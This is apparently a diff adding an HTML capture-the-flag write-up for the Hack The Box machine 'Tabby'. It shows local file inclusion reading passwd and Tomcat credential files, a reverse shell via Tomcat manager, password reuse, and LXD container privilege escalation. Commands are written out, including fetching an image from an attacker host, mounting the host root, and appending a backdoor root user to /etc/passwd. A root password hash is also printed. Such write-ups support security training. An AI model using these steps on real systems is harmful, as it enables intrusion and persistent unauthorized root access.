@@ -1,0 +1,195 @@
+I"�&<p><strong><center>Ref°: HTB-17-Machine</center></strong></p>
+
+<p>— Tabby is a vulnerable machine through LFI in tomcat service and the reuse of a password to get into the target.</p>
+
+<p>Privesc is possible from container LXD exploitation.</p>
+
+<p><img src="/assets/images/tabby/HTB-Information-Tabby.png" alt="Desktop View" /></p>
+
+<h2 id="1-discovery---figure-out-environment"><strong><span style="color:#c0392b">[1] Discovery - Figure out environment</span></strong></h2>
+<h3 id="network-service-scanning">Network Service Scanning</h3>
+<hr />
+
+<p>We have the 4 following open ports : 22, 80, 8080 and 4446</p>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-nmap.png" alt="Desktop View" /></p>
+
+<h3 id="website-on-port-80">Website on port 80</h3>
+<hr />
+
+<p>We have website present on port 80.</p>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-website.png" alt="Desktop View" /></p>
+
+<p>THe main page reveal “We apologise to all our customers for the previous data breach. We have changed the site to remove this tool, and have invested heavily in more secure servers.”</p>
+
+<p>Interesting page : <a href="http://megahosting.htb/news.php">http://megahosting.htb/news.php</a></p>
+
+<h3 id="tomcat-service-on-port-8080">Tomcat service on port 8080</h3>
+<hr />
+
+<p>Interesting paths who need authentication :</p>
+<ul>
+  <li><a href="http://10.10.10.194:8080/host-manager/html">http://10.10.10.194:8080/host-manager/html</a></li>
+  <li><a href="http://10.10.10.194:8080/manager/html">http://10.10.10.194:8080/manager/html</a></li>
+</ul>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-tomcat.png" alt="Desktop View" /></p>
+
+<h2 id="2-weaponization---find-exploit-way"><strong><span style="color:#c0392b">[2] Weaponization - Find exploit way</span></strong></h2>
+<h3 id="fuzzing-and-lfi-in-tomcat-service">Fuzzing and LFI in Tomcat service</h3>
+<hr />
+
+<p>Reference : <a href="https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1">https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1</a></p>
+
+<p>Tomcat is vulnerable to LFI attack. We using this technique to recover sensitive information.</p>
+
+<p>Grab passwd file for example :</p>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-LFI_passwd.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-information_users.png" alt="Desktop View" /></p>
+
+<p>We know that Tomcat service has interesting information in its file “tomcat-users.xml” and the location seem to be in $CATALINA_HOME : <code class="language-plaintext highlighter-rouge">/usr/share/tomcat9/conf/tomcat-users.xml</code></p>
+
+<p>Fuzzing method can help us to search the good location of this file.</p>
+
+<p>Reference : <a href="https://wfuzz.readthedocs.io/en/latest/user/advanced.html">https://wfuzz.readthedocs.io/en/latest/user/advanced.html</a></p>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-fuzzing.png" alt="Desktop View" /></p>
+
+<p>Result success on folder <code class="language-plaintext highlighter-rouge">etc</code> and get the file :</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">wget http://10.10.10.194/news.php?file=../../../../../../usr/share/tomcat9/FUZZ/tomcat-users.xml
+</span></code></pre></div></div>
+
+<p>Plaintext password and rolename!</p>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-rolename_tomcat.png" alt="Desktop View" /></p>
+
+<p>The role rolename=”manager-script allows access to the text interface and the status pages only.</p>
+
+<p>We have the possibility to connect now on host-manager but we can’t exploit anything.</p>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-tomcat_host_manager.png" alt="Desktop View" /></p>
+
+<h2 id="3-foothold---get-into-the-target-"><strong><span style="color:#c0392b">[3] Foothold - Get into the target </span></strong></h2>
+<h3 id="deploy-malicious-remote-script-on-tomcat-manager">Deploy malicious remote script on tomcat manager</h3>
+<hr />
+
+<p>Reference : <a href="https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script">https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script</a></p>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-payload.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-deploy_remote_script_tomcat.png" alt="Desktop View" /></p>
+
+<p>We launch this new script from URL : http://10.10.10.194/privuser45</p>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-get_revshell.png" alt="Desktop View" /></p>
+
+<h2 id="4-lateral-movement---move-through-environment"><strong><span style="color:#c0392b">[4] Lateral Movement - Move through environment</span></strong></h2>
+<h3 id="recover-archive-backup">Recover archive backup</h3>
+<hr />
+
+<p>Archive file backup present under website folders. We recover it to try finding anything inside.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">wget http://10.10.10.194/files/16162020_backup.zip
+</span></code></pre></div></div>
+
+<h3 id="cracking-archive-password">Cracking archive password</h3>
+<hr />
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-archive_password.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-crackzip.png" alt="Desktop View" /></p>
+
+<h3 id="reusing-password-of-ash-user">Reusing password of ash user</h3>
+<hr />
+
+<p>ash user reuse this password and we can connect on from “su” command.</p>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-reuse_password.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-flag_user.png" alt="Desktop View" /></p>
+
+<h2 id="5-privilege-escalation---gain-higher-level-permissions"><strong><span style="color:#c0392b">[5] Privilege Escalation - Gain higher-level permissions</span></strong></h2>
+<h3 id="enumeration">Enumeration</h3>
+<hr />
+
+<p>Many interesting information about lxd from linpeas enumeration.</p>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-linpeas.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-linpeas_1.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-linpeas_2.png" alt="Desktop View" /></p>
+
+<h3 id="container-lxd-exploitation">Container LXD Exploitation</h3>
+<hr />
+
+<p>References :</p>
+<ul>
+  <li><a href="https://www.hackingarticles.in/lxd-privilege-escalation/">https://www.hackingarticles.in/lxd-privilege-escalation/</a></li>
+  <li><a href="https://www.exploit-db.com/exploits/46978">https://www.exploit-db.com/exploits/46978</a></li>
+  <li><a href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></li>
+</ul>
+
+<p>The solution : mount root path in container with <code class="language-plaintext highlighter-rouge">lxd alpine builder</code></p>
+
+<p>From offensive machine :</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">git clone  https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder
+./build-alpine
+</span></code></pre></div></div>
+
+<p>From victim machine :</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">wget 10.10.14.67:1337/alpine-v3.12-x86_64-20200906_1836.tar.gz
+lxc image import alpine-v3.12-x86_64-20200906_1836.tar.gz --alias privuser45 &amp;&amp; lxd init --auto
+lxc image list
+lxc init privuser45 privesc -c security.privileged=true
+lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
+lxc start privesc
+lxc exec privesc sh
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-malicious_container.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-create_container.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-conf_container.png" alt="Desktop View" /></p>
+
+<p>And we start our malicious container containing root path in <code class="language-plaintext highlighter-rouge">/mnt/root/root</code> .</p>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-privesc_container.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-flag_root.png" alt="Desktop View" /></p>
+
+<h4 id="bruteforce-with-johntheripper-">Bruteforce with johntheripper :</h4>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root:$</span>6<span class="nv">$86Nxy4plrFeu0w4C$IfFB5j7BEbjBrUOtkmxyfUZ0lnNIxAcFn3meuvjGqFPSIogXynKx9FU1w3XJIC60rvwuKcg6feaeBqcNWMO0H</span>/:18429:0:99999:7:::
+<span class="go">root:x:0:0:root:/root:/bin/bash
+</span></code></pre></div></div>
+
+<p>#### Add malicious user with root privilege :
+Reference : <a href="https://hacknpentest.com/linux-privilege-escalation-via-writeable-etc-passwd-file/">https://hacknpentest.com/linux-privilege-escalation-via-writeable-etc-passwd-file/</a></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">perl -le 'print crypt("Password@973","addedsalt")'
+</span><span class="gp">echo "privuser45:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" &gt;</span><span class="o">&gt;</span> /mnt/root/etc/passwd
+<span class="go">
+lxc delete privesc &amp;&amp; lxc image delete privuser45
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-malicious_user.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/tabby/HTB-Images-Tabby-malicious_user_1.png" alt="Desktop View" /></p>
+
+<hr />
+
+<h1 id="trophy"><strong><center>Trophy</center></strong></h1>
+
+<blockquote>
+  <p><strong>If you can’t give me poetry, can’t you give me poetical science?</strong></p>
+
+  <p>Ada Lovelace</p>
+</blockquote>
+:ET
